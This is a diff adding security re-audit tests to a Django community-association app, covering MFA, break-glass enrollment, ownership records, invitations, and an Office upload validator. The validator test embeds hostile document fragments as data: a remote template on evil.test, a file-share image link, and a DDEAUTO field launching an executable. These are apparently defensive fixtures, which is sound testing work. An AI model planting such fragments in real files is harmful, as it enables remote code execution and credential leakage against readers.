@@ -8,6 +8,7 @@ import pytest
 from django.core.files.uploadedfile import SimpleUploadedFile
 from django.test import RequestFactory, override_settings
 
+from accounts.tests.helpers import PASSWORD
 from core.logging import JsonFormatter
 
 
@@ -261,3 +262,178 @@ def test_titles_are_single_line_for_email_subjects():
 
 def test_permissions_policy_header(client):
     assert "camera=()" in client.get("/healthz")["Permissions-Policy"]
+
+
+# --- Re-audit of the fixes (second iteration) -------------------------------------
+
+
+def test_the_last_authenticator_cannot_be_removed(db):
+    """R1: removing it would lock the owner out until a two-member reset."""
+    from allauth.mfa.adapter import get_adapter
+    from allauth.mfa.models import Authenticator
+
+    from community.tests.factories import LotFactory, make_member
+
+    user = make_member(lots=[LotFactory()])
+    only = Authenticator.objects.get(user=user, type=Authenticator.Type.TOTP)
+    assert get_adapter().can_delete_authenticator(only) is False
+    Authenticator.objects.create(user=user, type=Authenticator.Type.WEBAUTHN, data={})
+    assert get_adapter().can_delete_authenticator(only) is True
+
+
+def test_break_glass_enrollment_code_only_when_the_board_cannot_reset(db):
+    """R2: the first officer who missed the setup window had no way back."""
+    import io
+
+    from django.core.management import call_command
+    from django.core.management.base import CommandError
+
+    from community.models import Role
+    from community.tests.factories import make_member
+    from core.policy import SYSTEM  # noqa: F401
+
+    officer = make_member(board=True, roles=[Role.SYSADMIN], mfa=False)
+    out = io.StringIO()
+    call_command(
+        "breakglass_enrollment_code",
+        user=officer.pk,
+        actor=officer.email,
+        reason="first officer missed the setup window",
+        stdout=out,
+    )
+    assert "-" in out.getvalue().splitlines()[-1]  # the code, e.g. ABCD-EFGH-JKLM
+    make_member(board=True)
+    make_member(board=True)
+    other = make_member(board=True, mfa=False)
+    with pytest.raises(CommandError, match="assisted reset"):
+        call_command(
+            "breakglass_enrollment_code",
+            user=other.pk,
+            actor=officer.email,
+            reason="should use the assisted reset now",
+        )
+
+
+def test_re_recorded_ownership_keeps_the_owners_history(db):
+    """R3: adding a spouse restarted the ownership and hid the owner's records."""
+    from datetime import timedelta
+
+    from django.utils import timezone
+
+    from community import services
+    from community.models import Person
+    from community.tests.factories import LotFactory, PersonFactory, make_member
+    from core import policy
+    from core.policy import SYSTEM
+    from core.scoping import system_access
+
+    lot = LotFactory()
+    owner = make_member(lots=[lot])  # ownership started 300 days ago
+    with system_access("t"):
+        person = Person.objects.get(user=owner)
+    services.transfer_lot(
+        lot, new_owners=[person, PersonFactory()], transfer_date=timezone.localdate(), actor=SYSTEM
+    )
+    since = dict(policy.roles_for(owner).owned_since)[lot.pk]
+    assert since <= timezone.localdate() - timedelta(days=299)
+
+
+def test_violation_dismissed_before_notice_stays_internal(db):
+    """R5."""
+    from community.tests.factories import LotFactory, make_member
+    from compliance import services
+    from compliance.models import Violation
+
+    lot = LotFactory()
+    board, owner = make_member(board=True), make_member(lots=[lot])
+    v = services.report(lot=lot, category="trash", description="tip-off", actor=board)
+    services.VIOLATION.apply(v, "dismiss", actor=board, note="Not a violation")
+    assert not Violation.objects.for_user(owner).exists()
+
+
+def test_seller_loses_their_arc_request_after_selling(db):
+    """R6: the applicant clause ignored ownership."""
+    from django.utils import timezone
+
+    from arc import services as arc
+    from arc.models import ArcRequest
+    from community import services
+    from community.tests.factories import LotFactory, PersonFactory, make_member
+    from core.policy import SYSTEM
+
+    sold, kept = LotFactory(), LotFactory()
+    seller = make_member(lots=[sold, kept])
+    req = arc.create_request(lot=sold, title="Deck", description="x", actor=seller)
+    services.transfer_lot(
+        sold, new_owners=[PersonFactory()], transfer_date=timezone.localdate(), actor=SYSTEM
+    )
+    assert not ArcRequest.objects.for_user(seller).filter(pk=req.pk).exists()
+
+
+@pytest.mark.parametrize(
+    "extra,rels",
+    [
+        (
+            {},
+            b"<Relationship Id='r1' Type='http://x/attachedTemplate' "
+            b"Target='https://evil.test/t.dotm' TargetMode='External'/>",
+        ),
+        (
+            {},
+            b'<Relationship Id="r2" Type="http://x/image" Target="file://host/share/a.png" '
+            b'TargetMode="External"/>',
+        ),
+        ({"word/footer1.xml": b'<w:fldSimple w:instr=" DDEAUTO c:\\\\x.exe "/>'}, b""),
+        ({"xl/externalLinks/externalLink1.xml": b"<x/>"}, b""),
+    ],
+    ids=["single-quoted-template", "external-image", "dde-field", "excel-external-link"],
+)
+def test_office_bypasses_found_on_re_audit_are_refused(extra, rels):
+    """R4."""
+    from documents.validation import UploadRejected, check_upload
+
+    with pytest.raises(UploadRejected):
+        check_upload(_docx(extra, rels))
+
+
+def test_external_hyperlinks_are_still_allowed():
+    from documents.validation import check_upload
+
+    rels = (
+        b'<Relationship Id="r3" Type="http://x/hyperlink" '
+        b'Target="https://example.org" TargetMode="External"/>'
+    )
+    assert check_upload(_docx(rels=rels)).ext == "docx"
+
+
+def test_owners_cannot_pile_up_draft_arc_requests(db):
+    """R7: each draft could hold 40 permanent files."""
+    from arc import services as arc
+    from community.tests.factories import LotFactory, make_member
+
+    lot = LotFactory()
+    owner = make_member(lots=[lot])
+    for i in range(arc.MAX_OPEN_DRAFTS):
+        arc.create_request(lot=lot, title=f"Idea {i}", description="x", actor=owner)
+    with pytest.raises(arc.ArcError, match="draft"):
+        arc.create_request(lot=lot, title="One too many", description="x", actor=owner)
+
+
+def test_invitation_for_another_address_cannot_be_accepted_or_resent(db):
+    """R9: invitations created before the fix with a different address."""
+    from accounts import services
+    from accounts.models import Invitation
+    from community.tests.factories import PersonFactory, make_member
+    from core.scoping import system_access
+
+    board = make_member(board=True)
+    invitation = services.create_invitation(
+        person=PersonFactory(email="owner@example.org"), actor=board, send_email=False
+    )
+    with system_access("t"):
+        Invitation.objects.filter(pk=invitation.pk).update(email="attacker@example.net")
+    invitation.refresh_from_db()
+    with pytest.raises(services.InvitationError):
+        services.resend_invitation(invitation, actor=board)
+    with pytest.raises(services.InvitationError):
+        services.accept_invitation(invitation, password=PASSWORD)
